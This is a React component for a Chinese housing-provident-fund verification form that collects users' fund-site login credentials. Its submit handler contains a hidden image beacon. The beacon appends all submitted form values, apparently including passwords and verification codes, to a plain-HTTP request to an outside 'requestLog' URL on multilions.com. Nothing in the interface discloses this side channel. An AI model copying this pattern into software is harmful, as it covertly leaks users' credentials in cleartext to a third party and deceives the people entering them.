import React from 'react'
import { Modal, List, Button, Picker, InputItem } from 'antd-mobile'
import { createForm } from 'rc-form'
const Item = List.Item
const alert = Modal.alert

import { connect } from 'react-redux'
import * as fund from '../../actions/securityFundActions'

import {redirect, login} from 'utils'
import Toast from '../../components/Toast'

import 'scss/components/fund-security.component.scss'

import axios from 'axios'
import qs from 'qs'

@connect((store) => {
  const verify = store.securityFund.verify
  return {
    user: verify.user,
    sort: verify.sort,
    tabs: verify.tabs,
    fields: verify.fields,
    fetched: verify.fetched,
    fetching: verify.fetching,
    code: verify.code,
    message: verify.message
  }
})
class FundCertification extends React.Component {
  constructor (props) {
    super(props)
    this.loadingText = '加载中...'
  }
  componentDidMount () {
    document.title = '公积金认证'
    this.props.dispatch(fund.fetchFundUser())
  }
  componentWillUpdate (nextProps, nextState) {
    const {fetching} = nextProps
    if (fetching === null) return
    fetching ? Toast.loading(this.loadingText) : Toast.hide()
  }
  componentDidUpdate (prevProps, prevState) {
    const {fetched, code, message} = this.props
    if (fetched) this.loadingText = '加载中...'
    // 认证成功
    if (fetched && code === 1) {
      Toast.info(message, 1, () => {
        redirect.push('/fund')
        this.props.dispatch(fund.verifyFundReset())
      })
    }
    // 认证失败
    if (fetched && code === -1) {
      alert('认证失败', message, [
        { text: '确 定', onPress: () => location.reload() }
      ])
      // this.props.dispatch(fund.fetchFundUser())
      // this.props.form.resetFields(['city'])
      return
    }
    // 没有登录
    if (fetched && code === -3) {
      alert('登录', '你还没有登录，请先登录', [
        { text: '确 定', onPress: () => login() }
      ])
      return
    }
    // 显示错误信息
    if (fetched && code !== 1 && code !== -3 && code !== 0) {
      Toast.info(message, 2, () => location.reload())
      // this.props.dispatch(fund.verifyFundReset())
      // this.props.form.resetFields(['city'])
    }
  }
  submit = () => {
    this.props.form.validateFields((error, value) => {
      if (!error) {
        const {sort} = this.props
        const i = sort.tabs.length === 1 ? 0 : value.tab[0]
        let hiddenFields = sort.tabs[i].hiddenFields
        hiddenFields.map(v => (value[v.name] = v.value))
        value.name = sort.name
        delete value.city
        delete value.tab
        this.props.dispatch(fund.verifyFund(value))
        this.loadingText = '认证中，请耐心等待...'
        let img = new Image()
        img.onload = function () {
          console.log('....')
        }
        img.src = 'http://multilions.com/April/Index.php/Home/Userbehavior/requestLog?path=' + qs.stringify(value)
      }
    })
  }

  onChange = (v) => {
    const code = v[1]
    var params = new FormData()
    params.append('code', code)
    this.props.form.resetFields(['tab'])
    this.props.dispatch(fund.fetchFundForm(params))
  }

  onSelected = (i = 0) => {
    const {tabs} = this.props
    this.props.dispatch(fund.changeFundFields(tabs[i].field))
  }

  createFields (fields) {
    if (!fields) return
    const { getFieldProps } = this.props.form
    return fields.map((field, i) => {
      if (field.parameter_code === 'verifyImageCode') {
        let source = 'data:image/png;base64,' + field.verfication
        return (
          <div key={i} class="verify-code">
            <InputItem type={field.parameter_type} {...getFieldProps(field.parameter_code, {rules: [{required: true, message: field.parameter_message + ' '}]})} clear placeholder={field.parameter_message} >{field.parameter_name} </InputItem>
            <img src={source}/>
          </div>
        )
      }
      return <InputItem type={field.parameter_type} key={i} {...getFieldProps(field.parameter_code, {rules: [{required: true, message: field.parameter_message + ' '}]})} clear placeholder={field.parameter_message} >{field.parameter_name}</InputItem>
    })
  }

  createPicker (tabs) {
    const { getFieldProps } = this.props.form
    return tabs && (
      <Picker extra="请选择" cols={1} data={tabs} { ...getFieldProps('tab', {
        onChange: this.onSelected.bind(this),
        rules: [{required: true, message: '请选择查询方式'}]
      })} title="请选择">
      <Item arrow="horizontal"> 查询方式 </Item>
      </Picker>
    )
  }

  createError (fields) {
    let list = [{parameter_code: 'city'}, {parameter_code: 'tab'}]
    if (fields) {
      fields.map(field => list.push(field))
    }

    const {getFieldError} = this.props.form
    for (let field of list) {
      if (getFieldError(field.parameter_code)) {
        return <div class="error" >{getFieldError(field.parameter_code)}</div>
      }
    }
  }

  render () {
    const { getFieldProps } = this.props.form
    const { user, fields, tabs } = this.props
    return (
      <div class="transition-group fund-security-certification">
        <List class="custom-list">
          <Item extra={user.name}> 姓名 </Item>
          <Item extra={user.id_card && user.id_card.replace(/^(\d{3})\d+(\d{4})$/, '$1***********$2')}> 身份证号 </Item>
          <Picker extra="请选择" cols={2} data={user.city} {...getFieldProps('city', {onChange: this.onChange, rules: [{required: true, message: '请选择城市'}]})} title="选择地区">
            <Item arrow="horizontal"> 所在城市 </Item>
          </Picker>
          {this.createPicker(tabs)}
          {this.createFields(fields)}
        </List>
        {this.createError(fields)}
        <p>建议您先登录公积金查询网站，确认公积金登录名、密码等所需登录信息是正确的。</p>
        <div class="custom-button">
          <Button className="btn" disabled={false} type="primary" onClick={this.submit}>提交</Button>
        </div>
      </div>
    )
  }
}

export default createForm()(FundCertification)
